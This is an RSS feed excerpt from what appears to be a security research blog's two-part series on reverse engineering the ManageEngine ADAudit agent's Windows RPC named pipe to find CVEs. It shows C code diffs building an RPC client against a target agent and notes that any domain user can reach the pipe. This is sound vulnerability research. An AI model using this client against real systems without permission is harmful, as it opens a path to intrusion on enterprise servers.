&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pszEndpoint         &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;pipe&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;hello&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pszOptions          &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pszStringBinding    &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pszString           &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello, world&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; ulCode;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    status &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;RpcStringBindingCompose&lt;/span&gt;(pszUuid,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                     pszProtocolSequence,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                     pszNetworkAddress,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                     pszEndpoint,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                     pszOptions,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                     &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pszStringBinding);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (status) &lt;span style=&#34;color:#a6e22e&#34;&gt;exit&lt;/span&gt;(status);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    status &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;RpcBindingFromStringBinding&lt;/span&gt;(pszStringBinding, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;hello_ClientIfHandle);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (status) &lt;span style=&#34;color:#a6e22e&#34;&gt;exit&lt;/span&gt;(status);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RpcTryExcept  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;HelloProc&lt;/span&gt;(pszString);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;Shutdown&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;RpcExcept&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ulCode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;RpcExceptionCode&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Runtime reported exception 0x%lx = %ld&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, ulCode, ulCode);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RpcEndExcept
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    status &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;RpcStringFree&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pszStringBinding); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (status) &lt;span style=&#34;color:#a6e22e&#34;&gt;exit&lt;/span&gt;(status);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    status &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;RpcBindingFree&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;hello_IfHandle);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (status) &lt;span style=&#34;color:#a6e22e&#34;&gt;exit&lt;/span&gt;(status);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/******************************************************/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*         MIDL allocate and free                     */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/******************************************************/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __RPC_FAR &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; __RPC_USER &lt;span style=&#34;color:#a6e22e&#34;&gt;midl_user_allocate&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;size_t&lt;/span&gt; len)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;malloc&lt;/span&gt;(len));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __RPC_USER &lt;span style=&#34;color:#a6e22e&#34;&gt;midl_user_free&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __RPC_FAR &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ptr)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;free&lt;/span&gt;(ptr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The first modification we need to do is to replace the filename on line 1 and
line 5 &lt;code&gt;#include &amp;quot;hello.h&amp;quot;&lt;/code&gt; to
&lt;code&gt;#include &amp;quot;ADAPAgentRpcPipe_h.h&amp;quot;&lt;/code&gt; as we have compiled our own header file
created via the IDL file. In addition to we add a line with &lt;code&gt;#pragma comment(lib, rpcrt4.lib&amp;quot;)&lt;/code&gt; to
be able to create RPC bindings.&lt;/p&gt;
&lt;p&gt;The result:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;- /* file: helloc.c */
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;  #include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  #include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  #include &amp;lt;ctype.h&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;- #include &amp;#34;hello.h&amp;#34; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;  #include &amp;lt;windows.h&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+ /* file: adauditrpc-client.cpp */
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;&lt;/span&gt;  #include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  #include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  #include &amp;lt;ctype.h&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+ #include &amp;#34;ADAPAgentRpcPipe_h.h&amp;#34; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;&lt;/span&gt;  #include &amp;lt;windows.h&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+ #pragma comment(lib, &amp;#34;rpcrt4.lib&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next step is to replace some data types and initiate variables to be used
for the RPC bindings. These can be found on lines 12-19.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     RPC_STATUS status;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-    unsigned char * pszUuid             = NULL;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-    unsigned char * pszProtocolSequence = &amp;#34;ncacn_np&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-    unsigned char * pszNetworkAddress   = NULL;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-    unsigned char * pszEndpoint         = &amp;#34;\\pipe\\hello&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-    unsigned char * pszOptions          = NULL;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-    unsigned char * pszStringBinding    = NULL;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-    unsigned char * pszString           = &amp;#34;hello, world&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;     unsigned long ulCode;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     RPC_STATUS status;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+    RPC_WSTR pszUuid = NULL;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+    RPC_WSTR pszProtocolSequence = (RPC_WSTR)L&amp;#34;ncacn_np&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+    RPC_WSTR pszNetworkAddress = (RPC_WSTR)L&amp;#34;100.64.5.212&amp;#34;; // Target ADAudit agent
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+    RPC_WSTR pszEndpoint = (RPC_WSTR)L&amp;#34;\\pipe\\ADAPAgentRpcPipe&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+    RPC_WSTR pszOptions = NULL;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+    RPC_WSTR pszStringBinding = NULL;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;+    //unsigned char * pszString           = &amp;#34;hello, world&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;&lt;/span&gt;     unsigned long ulCode;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;At line 29 we replace:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;- status = RpcBindingFromStringBinding(pszStringBinding, &amp;amp;hello_ClientIfHandle);
+ status = RpcBindingFromStringBinding(pszStringBinding, &amp;amp;DefaultIfName_v1_0_c_ifspec);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And line 49:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;- status = RpcBindingFree(&amp;amp;hello_IfHandle);
+ status = RpcBindingFree(&amp;amp;DefaultIfName_v1_0_c_ifspec);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;&amp;amp;DefaultIfName_v1_0_c_ifspec&lt;/code&gt; parameter is defined in the header file
from our IDL compilation as we named our RPC interface &lt;code&gt;DefaultIfName&lt;/code&gt;
(Line 5 in ADAPAgentRpcPipe.idl).&lt;/p&gt;
&lt;p&gt;The last step would be to call the correct procedures as stated in our IDL:
&lt;code&gt;Proc0&lt;/code&gt;, &lt;code&gt;Proc1&lt;/code&gt; or &lt;code&gt;Proc2&lt;/code&gt;. At this point in time we have no clue what the
procedures do when they are triggered on the agent side but we aim to find out.&lt;/p&gt;
&lt;p&gt;At line 34 and 35 Microsoft&amp;rsquo;s example code calls the example procedures
&lt;code&gt;HelloProc()&lt;/code&gt; and &lt;code&gt;Shutdown()&lt;/code&gt;. We will continue with replacing these with &lt;code&gt;Proc0&lt;/code&gt;
and provide valid arguments to test our first ADAuditAgentRpcPipe procedure.&lt;/p&gt;
&lt;p&gt;By reviewing our IDL structure for &lt;code&gt;Proc0&lt;/code&gt; we also know that the
procedure takes two argument:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;adaudit-rpc-proc0-args.png&#34; alt=&#34;adaudit-rpc-proc0-args&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;arg_0&lt;/code&gt; with datatype &lt;code&gt;long&lt;/code&gt; which is an integer datatype
and &lt;code&gt;arg_1&lt;/code&gt; with datatype &lt;code&gt;long*&lt;/code&gt; which is a pointer to a long.
&lt;code&gt;arg_1&lt;/code&gt; is defined with &lt;code&gt;[in][out]&lt;/code&gt; meaning that this may be output from
the application.&lt;/p&gt;
&lt;p&gt;As our IDL header structure lacks an implicit handle we need to provide a
handle (&lt;code&gt;&amp;amp;DefaultIfName_v1_0_c_ifspec&lt;/code&gt;) to &lt;code&gt;Proc0&lt;/code&gt;, we&amp;rsquo;ll also instantiate
variables for &lt;code&gt;arg_0&lt;/code&gt; and &lt;code&gt;arg_1&lt;/code&gt;:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-    RpcTryExcept
-    {
-        HelloProc(pszString);
-        Shutdown();
-    }

+    long arg_0 = 0;
+    long arg1_pointer;
+    long* arg_1 = &amp;amp;arg1_pointer;
+    RpcTryExcept
+    {
+        Proc0(DefaultIfName_v1_0_c_ifspec, arg_0, arg_1);
+    }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In order for Visual Studio to reference &lt;code&gt;DefaultIfName_v1_0_c_ifspec&lt;/code&gt;, we need to include the
&lt;code&gt;ADAPAgentRpcPipe_c.c&lt;/code&gt; file in our list of source files:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;add-existing-item-to-visual-studio.png&#34; alt=&#34;add-existing-item-to-visual-studio&#34;&gt;&lt;/p&gt;
&lt;p&gt;Also add the &lt;code&gt;ADAPAgentRpcPipe_h.h&lt;/code&gt; file under &lt;em&gt;Header Files&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;The final project structure in Visual Studio should now look loo this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;visual-studio-projekt-structure.png&#34; alt=&#34;visual-studio-projekt-structure&#34;&gt;&lt;/p&gt;
&lt;p&gt;And if every step is followed  correctly the project should now build. Voilà&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;build-of-adauditagentrpc-successful.png&#34; alt=&#34;build-of-adauditagentrpc-successful&#34;&gt;&lt;/p&gt;
&lt;p&gt;But does it actually work?&lt;/p&gt;
&lt;p&gt;Running the binary from the command line does not print any output unless an
exception is thrown but
if the network traffic is analyzed with Wireshark we can see
similar traffic to when the RPC interaction was triggered by
the ADAudit web application.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;adaudit-rpc-agent-now-working.png&#34; alt=&#34;adaudit-rpc-agent-now-working&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;O.. M.. G.. it seems to work!&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;In this part of the research we successfully created a working RPC client
to interact with the ADAudit Agent. But we still don&amp;rsquo;t know what either &lt;code&gt;Proc0&lt;/code&gt;,
&lt;code&gt;Proc1&lt;/code&gt; or &lt;code&gt;Proc2&lt;/code&gt; does. In part 2, we dig into reverse engineering of
the agent software in an attempt to find out what we actually can do with
our newly created client.&lt;/p&gt;
&lt;p&gt;Support us by following our LinkedIn page and get notified when new research
is published: &lt;a href=&#34;https://www.linkedin.com/company/shelltrail&#34;&gt;https://www.linkedin.com/company/shelltrail&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Follow this URL to read part 2: &lt;a href=&#34;https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/&#34;&gt;https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>ManageEngine ADAudit - Reverse engineering Windows RPC to find CVEs - part 2 / reverse engineering</title>
      <link>https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/</link>
      <pubDate>Mon, 27 May 2024 00:00:00 +0000</pubDate>
      
      <guid>https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/</guid>
      <description>&lt;h2 id=&#34;reverse-engineering-adapagentexe&#34;&gt;Reverse engineering ADAPAgent.exe&lt;/h2&gt;
&lt;p&gt;So if you followed the part 1 of this research we got a fully working RPC client
to interact with the ADAudit Agent. Nice.&lt;/p&gt;
&lt;p&gt;We still have alot to accomplish to reach some kind of goal:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Create a valid IDL structure&lt;/li&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Brew a large can of coffee&lt;/li&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Build a RPC client&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Guess a lot&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Create input data that will be marshalled into a valid stub that server will act on.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;When testing the custom &lt;code&gt;adauditrpc-client&lt;/code&gt; from different authentication
context&amp;rsquo;s it was determined that only &lt;code&gt;Domain Users&lt;/code&gt; permission was needed
to connect to the RPC interface over the network. The reason
for this is because the ADAudit Agent RPC server is configured with a &lt;code&gt;ncacn_np&lt;/code&gt;
interface. And this interface requires binding of the named pipe over SMB in
order to negotiate which port the forthcoming network communication
should rely on. And because &lt;code&gt;Domain Users&lt;/code&gt; by default can communication with
SMB on adjacent servers and computers, this satisfies the RPC authentication part
of ManageEngine&amp;rsquo;s ADAuditAgent.&lt;/p&gt;
&lt;p&gt;Apart from this, there are no additional access control lists applied to the
named pipe:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;checking-acl-of-adapagentrpcpipe.png&#34; alt=&#34;checking-acl-of-adapagentrpcpipe&#34;&gt;&lt;/p&gt;
&lt;p&gt;If the custom &lt;code&gt;adauditrpc-client&lt;/code&gt; is executed on the local host in
a low-privileged session &lt;em&gt;&amp;ldquo;no&amp;rdquo;&lt;/em&gt; authentication is required as
Windows automatically forwards the current authenticated session.&lt;/p&gt;
&lt;p&gt;For the last steps on our to do-list we need to dig a bit deeper:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; Create input data that will be marshalled into a valid stub that the server will act on.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now we need to figure out which input data we can send and how the AD Audit
Agent will behave based on the various input.
Luckily we can turn to logs on the target machine and hopefully find more information
how this agent works.&lt;/p&gt;
&lt;p&gt;After searching through all files on the target Windows machine at
&lt;code&gt;C:\Program Files\ManageEngine\ADAuditPlusAgent\&lt;/code&gt;
we can observe that running the RPC client generates a log entry similar
to this:&lt;/p&gt;
